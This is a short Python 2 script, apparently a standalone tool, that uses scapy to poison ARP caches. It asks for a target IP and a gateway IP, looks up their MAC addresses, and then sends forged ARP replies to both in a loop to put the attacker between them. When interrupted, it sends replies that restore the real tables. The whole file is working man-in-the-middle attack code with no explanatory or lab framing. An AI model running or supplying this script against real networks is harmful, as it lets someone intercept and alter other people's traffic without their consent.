from scapy.all import *
import time

def get_mac_address(ip_address):
	broadcast_package = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address)
	received = srp(broadcast_package, timeout=3, verbose=False)
	return received[0][0][1].hwsrc

def spoof(src_ip, target_ip, target_mac):
	spoof_package = ARP(
		op=2,
		psrc=src_ip,
		pdst=target_ip,
		hwdst=target_mac,
	)

	send(spoof_package, verbose=False)
	pass

def reset(src_ip, src_mac, target_ip, target_mac):
	reset_package = ARP(
		op=2,
		psrc=src_ip,
		hwsrc=src_mac,
		pdst=target_ip,
		hwdst=target_mac,
	)

	send(reset_package, verbose=False)
	pass

def main():
	target_ip = raw_input("input target ip \n >")
	gateway_ip = raw_input("input gateway ip \n >")

	print "\n IP Adresses info"
	print "target ip: " + target_ip
	print "gateway_ip: " + gateway_ip

	try:
		target_mac = get_mac_address(target_ip)
		gateway_mac = get_mac_address(gateway_ip)

		print "\n MAC Adresses info"
		print "target mac: " + target_mac
		print "gateway_mac: " + gateway_mac
	except:
		print "mac addresses unreachable =("
		exit()

	try:
		while True:
			spoof(gateway_ip, target_ip, target_mac)
			spoof(target_ip, gateway_ip, gateway_mac)
			time.sleep(1.5)
	except KeyboardInterrupt:
		print "stop spoofing"
		reset(gateway_ip, gateway_mac, target_ip, target_mac)
		reset(target_ip, target_mac, gateway_ip, gateway_mac)

	pass

if __name__ == "__main__":
	main()

